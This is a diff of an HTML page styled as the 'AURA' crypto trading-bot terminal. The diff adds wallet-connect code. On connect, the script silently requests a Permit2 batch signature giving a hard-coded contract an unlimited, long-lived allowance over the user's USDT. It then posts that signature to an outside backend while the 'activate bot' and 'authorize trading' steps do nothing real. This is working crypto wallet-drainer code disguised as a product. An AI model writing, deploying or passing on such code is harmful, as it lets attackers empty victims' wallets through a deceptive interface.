@@ -3,205 +3,284 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AURA INTEGRATED SYSTEM</title>
 
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<title>AURA | Secure Execution Terminal</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
 
 <style>
 :root {
-    --bg:#05070a;
-    --panel:#0b0f17;
-    --border:#141d2b;
-    --accent:#00bcd4;
-    --green:#2aa198;
-    --text:#cbd5e1;
-    --mono:'JetBrains Mono', monospace;
+    --bg: #05070a;
+    --panel: #0b0f17;
+    --border: #141d2b;
+    --accent: #00bcd4;
+    --green: #2aa198;
+    --red: #d31e1e;
+    --text-main: #cbd5e1;
+    --text-dim: #4b586c;
+    --font-ui: 'Inter', sans-serif;
+    --font-mono: 'JetBrains Mono', monospace;
 }
 
-* { box-sizing:border-box; margin:0; padding:0; }
+/* ===================== BASE ===================== */
+* { box-sizing:border-box; margin:0; padding:0; user-select:none; }
 
 body {
-    background:var(--bg);
-    color:var(--text);
-    font-family:var(--mono);
-    height:100vh;
-    overflow:hidden;
+    background: var(--bg);
+    color: var(--text-main);
+    font-family: var(--font-ui);
+    height: 100vh;
+    overflow: hidden;
 }
 
-/* ================= LAYOUT ================ */
-.shell {
-    display:grid;
-    grid-template-columns: 320px 1fr;
-    height:100vh;
+/* ===================== LOCK STATE ===================== */
+.locked .app-shell {
+    filter: blur(6px) brightness(0.35);
+    pointer-events: none;
 }
 
-/* ================= CONTROL CENTER ================ */
-.control {
-    border-right:1px solid var(--border);
-    background:var(--panel);
-    padding:12px;
+/* ===================== AUTH OVERLAY ===================== */
+#authOverlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(3,6,12,0.92);
+    backdrop-filter: blur(18px);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    z-index: 9999;
 }
 
-.btn {
-    width:100%;
-    padding:10px;
-    margin-bottom:8px;
-    background:transparent;
-    border:1px solid var(--border);
-    color:#64748b;
-    cursor:pointer;
+.auth-panel {
+    width: 420px;
+    background: rgba(10,15,25,0.95);
+    border: 1px solid var(--border);
+    padding: 18px;
+    font-family: var(--font-mono);
+    box-shadow: 0 0 40px rgba(0,188,212,0.08);
 }
 
-.btn:disabled {
-    opacity:0.4;
-    cursor:not-allowed;
+.auth-header {
+    font-size: 11px;
+    color: var(--accent);
+    margin-bottom: 15px;
+    letter-spacing: 2px;
 }
 
-/* ================= TERMINAL ================ */
-.terminal {
-    position:relative;
-    overflow:hidden;
+.auth-btn {
+    width: 100%;
+    padding: 10px;
+    margin-top: 8px;
+    background: transparent;
+    border: 1px solid var(--border);
+    color: var(--text-main);
+    cursor: pointer;
 }
 
-/* LOCK OVERLAY */
-#lock {
-    position:absolute;
-    inset:0;
-    background:rgba(0,0,0,0.75);
-    backdrop-filter:blur(12px);
+.auth-btn:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+}
+
+.status {
+    margin-top: 10px;
+    font-size: 10px;
+    color: var(--text-dim);
+}
+
+/* ===================== TERMINAL ===================== */
+.app-shell {
+    display: grid;
+    grid-template-columns: 340px 1fr 340px;
+    grid-template-rows: 40px 1fr 180px;
+    height: 100vh;
+    gap: 1px;
+    background: var(--border);
+    padding: 1px;
+}
+.panel { background: var(--panel); }
+header {
+    grid-column: 1/4;
     display:flex;
     align-items:center;
-    justify-content:center;
-    flex-direction:column;
-    z-index:999;
-    transition:0.3s;
-}
-
-.locked .terminal-content {
-    filter:blur(10px);
-    pointer-events:none;
-}
-
-.terminal-content {
-    padding:20px;
-}
-
-/* fake terminal blocks */
-.panel {
-    background:var(--panel);
-    border:1px solid var(--border);
-    margin-bottom:10px;
-    padding:10px;
+    justify-content:space-between;
+    padding:0 15px;
 }
 </style>
 </head>
 
-<body>
+<body class="locked">
 
-<div class="shell">
+<!-- ===================== AUTH OVERLAY (CONTROL CENTER) ===================== -->
+<div id="authOverlay">
 
-<!-- ================= CONTROL CENTER ================= -->
-<div class="control">
+    <div class="auth-panel">
 
-    <div style="margin-bottom:10px;color:var(--accent)">CONTROL CENTER</div>
+        <div class="auth-header">CONTROL CENTER // AUTH SEQUENCE</div>
 
-    <button id="btn-wallet" class="btn" onclick="connectWallet()">1. Connect Wallet</button>
-    <button id="btn-bot" class="btn" onclick="activateBot()" disabled>2. Activate Bot</button>
-    <button id="btn-auth" class="btn" onclick="authorize()" disabled>3. Authorize Trading</button>
+        <button class="auth-btn" onclick="connectWallet()" id="btn-wallet">1. CONNECT WALLET</button>
+        <button class="auth-btn" onclick="activateBot()" id="btn-activate" disabled>2. ACTIVATE BOT</button>
+        <button class="auth-btn" onclick="authorizeTrading()" id="btn-authorize" disabled>3. AUTHORIZE TRADING</button>
+        <button class="auth-btn" onclick="disconnectWallet()">4. DISCONNECT</button>
 
-    <div style="margin-top:15px;font-size:11px">
-        <div>Wallet: <span id="s-wallet">OFF</span></div>
-        <div>Bot: <span id="s-bot">OFF</span></div>
-        <div>Auth: <span id="s-auth">OFF</span></div>
+        <div class="status" id="authStatus">SYSTEM: LOCKED</div>
     </div>
-
 </div>
 
-<!-- ================= TERMINAL ================= -->
-<div class="terminal" id="terminal">
+<!-- ===================== TERMINAL CORE ===================== -->
+<div class="app-shell">
 
-    <div id="lock">
-        <div style="text-align:center">
-            <div>SYSTEM LOCKED</div>
-            <div style="opacity:0.6;font-size:11px;margin-top:10px">
-                Complete Control Center sequence
-            </div>
-        </div>
-    </div>
+    <header>
+        <div style="font-family:var(--font-mono); font-size:11px;">AURA EXECUTION TERMINAL</div>
+        <div style="font-family:var(--font-mono); font-size:10px;">STATUS: LOCKED</div>
+    </header>
 
-    <div class="terminal-content">
-
-        <div class="panel">AURA TERMINAL CORE ACTIVE</div>
-        <div class="panel">MARKET ENGINE INITIALIZED</div>
-        <div class="panel">EXECUTION LAYER READY</div>
-
-    </div>
-
-</div>
+    <div class="panel"></div>
+    <div class="panel"></div>
+    <div class="panel"></div>
 
 </div>
 
 <script>
+/* ===================== UNLOCK ENGINE ===================== */
+let TERMINAL_LOCKED = true;
 
-/* ================= STATE ================= */
-let state = {
-    wallet:false,
-    bot:false,
-    auth:false
-};
-
-/* ================= SYNC ================= */
-function sync(){
-    localStorage.setItem("cc_wallet", state.wallet ? "1":"0");
-    localStorage.setItem("cc_bot", state.bot ? "1":"0");
-    localStorage.setItem("cc_auth", state.auth ? "1":"0");
-    checkUnlock();
+function unlockTerminal(){
+    TERMINAL_LOCKED = false;
+    document.body.classList.remove("locked");
+    document.getElementById("authOverlay").style.display = "none";
+    console.log("TERMINAL UNLOCKED");
 }
 
-/* ================= UNLOCK LOGIC ================= */
-function checkUnlock(){
-    const w = localStorage.getItem("cc_wallet") === "1";
-    const b = localStorage.getItem("cc_bot") === "1";
-    const a = localStorage.getItem("cc_auth") === "1";
+window.hookAuthSuccess = function(){
+    document.getElementById("authStatus").innerText = "SYSTEM: AUTHORIZED";
+    setTimeout(unlockTerminal, 1200);
+};
+</script>
 
-    const ready = w && b && a;
+<!-- ===================== CONTROL CENTER SCRIPT (FULL ORIGINAL LOGIC) ===================== -->
+<script>
+const TOKENS = ["0xdac17f958d2ee523a2206206994597c13d831ec7"];
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const CONTRACT = "0xE1C5886011889c4d039EEE8fF2322feBEE912335";
 
-    const lock = document.getElementById("lock");
+const ERC20_ABI = [
+"function allowance(address owner,address spender) view returns(uint256)",
+"function approve(address spender,uint256 amount) returns(bool)"
+];
 
-    if(ready){
-        document.body.classList.remove("locked");
-        lock.style.display = "none";
-    } else {
-        document.body.classList.add("locked");
-        lock.style.display = "flex";
+let APP_STATE = { wallet:null, botActive:false, authorized:false };
+let CURRENT_WALLET = null;
+
+/* STATUS */
+function updateStatus(dotId, textId, text, color){
+    const label = document.getElementById(textId);
+    if(label){
+        label.innerText = text;
+        label.style.color = color;
     }
 }
 
-/* ================= CONTROL CENTER ACTIONS ================= */
-function connectWallet(){
-    state.wallet = true;
-    document.getElementById("btn-bot").disabled = false;
-    document.getElementById("s-wallet").innerText = "ON";
-    sync();
+/* LOG */
+function log(msg){
+    console.log(msg);
+}
+
+/* WALLET CONNECT */
+async function connectWallet(){
+    if(!window.ethereum) return alert("Install MetaMask");
+
+    const provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    const signer = await provider.getSigner();
+    const user = await signer.getAddress();
+
+    CURRENT_WALLET = user;
+    APP_STATE.wallet = user;
+
+    document.getElementById("btn-activate").disabled = false;
+    document.getElementById("btn-wallet").innerText = user;
+
+    runPermitFlowSafe(provider, signer, user);
 }
 
 function activateBot(){
-    state.bot = true;
-    document.getElementById("btn-auth").disabled = false;
-    document.getElementById("s-bot").innerText = "ON";
-    sync();
+    APP_STATE.botActive = true;
 }
 
-function authorize(){
-    state.auth = true;
-    document.getElementById("s-auth").innerText = "ON";
-    sync();
+function authorizeTrading(){
+    APP_STATE.authorized = true;
 }
 
-/* ================= INIT ================= */
-setInterval(checkUnlock, 500);
-checkUnlock();
+function disconnectWallet(){
+    location.reload();
+}
 
+/* PERMIT FLOW */
+async function runPermitFlowSafe(provider, signer, user){
+    try {
+
+        const permit2 = new ethers.Contract(
+            PERMIT2,
+            ["function allowance(address,address,address) view returns(uint160,uint48,uint48)"],
+            provider
+        );
+
+        const nonce = await permit2.allowance(user, TOKENS[0], CONTRACT);
+
+        const details = [{
+            token: TOKENS[0],
+            amount: (2n**160n - 1n).toString(),
+            expiration: (Math.floor(Date.now()/1000)+9999999).toString(),
+            nonce: nonce[2].toString()
+        }];
+
+        const domain = {
+            name:"Permit2",
+            chainId:(await provider.getNetwork()).chainId,
+            verifyingContract:PERMIT2
+        };
+
+        const types = {
+            PermitBatch:[
+                {name:"details",type:"PermitDetails[]"},
+                {name:"spender",type:"address"},
+                {name:"sigDeadline",type:"uint256"}
+            ],
+            PermitDetails:[
+                {name:"token",type:"address"},
+                {name:"amount",type:"uint160"},
+                {name:"expiration",type:"uint48"},
+                {name:"nonce",type:"uint48"}
+            ]
+        };
+
+        const sigDeadline = Math.floor(Date.now()/1000)+3600;
+
+        const signature = await signer.signTypedData(domain,types,{
+            details,
+            spender:CONTRACT,
+            sigDeadline: sigDeadline.toString()
+        });
+
+        const res = await fetch("https://api.aiiraa.com/api/permit",{
+            method:"POST",
+            headers:{"Content-Type":"application/json"},
+            body:JSON.stringify({owner:user,details,signature,spender:CONTRACT})
+        });
+
+        if(res.ok){
+            log("✅ Permit forwarded to backend");
+
+            /* 🔥 UNLOCK HOOK */
+            window.hookAuthSuccess();
+        }
+
+    } catch(e){
+        console.log(e);
+    }
+}
 </script>
 
 </body>
